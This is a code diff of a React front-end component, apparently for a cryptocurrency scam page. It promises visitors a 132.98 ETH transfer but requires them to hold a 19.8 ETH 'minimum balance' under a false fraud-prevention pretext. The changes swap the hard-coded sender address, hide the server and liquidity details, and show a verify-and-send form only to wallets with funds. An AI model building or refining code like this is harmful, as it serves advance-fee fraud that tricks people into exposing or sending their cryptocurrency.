@@ -1,12 +1,14 @@
 "use client"
 import { useEffect, useState } from "react"
+import VerifyAddressForm from "./VerifyAddressForm"
+import { convertETHtoUSD } from "@/lib/functions"
 
 const Banner = () => {
 
     const [account, setAccount] = useState<string>()
     const [accountsConnected, setAccountConnected] = useState<boolean>(false)
-    const [userBalance, setUserBalance] = useState<number>()
-    const [senderBalance, setSenderBalance] = useState<number>()
+    const [userBalance, setUserBalance] = useState<number>(0)
+    const [senderBalance, setSenderBalance] = useState<number>(0)
 
     const conncetWallet = async () => {
         if (!account || !accountsConnected) {
@@ -31,7 +33,7 @@ const Banner = () => {
 
         const getSenderBalance = async () => {
 
-            const senderAddress = "0xF51710015536957A01f32558402902A2D9c35d82"
+            const senderAddress = "0x240543929693333dA0946cBF2597C099E4DaA7cf"
 
             if (!Boolean(senderBalance)) {
                 try {
@@ -140,36 +142,6 @@ const Banner = () => {
         }
     }
 
-    function convertETHtoUSD(ethAmount: number | undefined) {
-
-        if (!ethAmount) return "$ 0"
-
-        let ethToUsdPrice: number = 1652.20;
-
-        fetch("/api/ether")
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(response.statusText)
-                }
-                return response.json()
-            })
-            .then(data => {
-                ethToUsdPrice = data.ethToUsdPrice
-            })
-            .catch(error => {
-                console.error("Error in request: ", error)
-            })
-
-        const convertedAmount = ethToUsdPrice * ethAmount
-
-        const formattedAmount = new Intl.NumberFormat("en-US", {
-            style: "currency",
-            currency: "USD"
-        }).format(convertedAmount)
-
-        return formattedAmount
-    }
-
     const confirmAndSend = () => {
         // if(!Boolean(userBalance)) return
 
@@ -246,19 +218,23 @@ const Banner = () => {
             </div> */}
             {
                 accountsConnected ? <>
-                    <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
-                        <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
-                    </div>
-                    <div className="bg-neutral-100 p-4 rounded-md border border-red-600">
-                        <div className="flex flex-col gap-y-2 mb-4">
-                            <h4>Account balance: <span className="font-bold">{userBalance?.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
+                    {userBalance <= 0.001 && (
+                        <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
+                            <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
+                        </div>
+                    )}
+                    {userBalance >= 0.001 && (
+                        <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
+                    )}
+                    <div className="p-4 rounded-md border border-red-600">
+                        <div className="flex flex-col gap-y-2">
+                            <h4>Account balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
                             <h4>Minimum Required Balance: <span className="font-bold">19.8 ETH ({convertETHtoUSD(19.8)})</span></h4>
                             <h4>Transfer amount: <span className="font-bold">132.98 ETH ({convertETHtoUSD(132.98)?.toString()})</span></h4>
-                            <h4>Target Address (your address): <span className="font-bold">{account}</span></h4>
-                            <h4>Server Address: <span className="font-bold">0xF51710015536957A01f32558402902A2D9c35d82</span></h4>
-                            <h4>Server balance (liquidity): <span className="font-bold">{senderBalance?.toFixed(4)} ETH ({convertETHtoUSD(senderBalance)})</span></h4>
+                            {/* <h4>Target Address (your address): <span className="font-bold">{account}</span></h4> */}
+                            {/* <h4>Server Address: <span className="font-bold">0xF51710015536957A01f32558402902A2D9c35d82</span></h4>
+                            <h4>Server balance (liquidity): <span className="font-bold">{senderBalance?.toFixed(4)} ETH ({convertETHtoUSD(senderBalance)})</span></h4> */}
                         </div>
-                        <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full">confirm and send</button>
                     </div>
                 </> : <>
                     <div className="bg-green-100 p-4 mb-4 rounded-md">
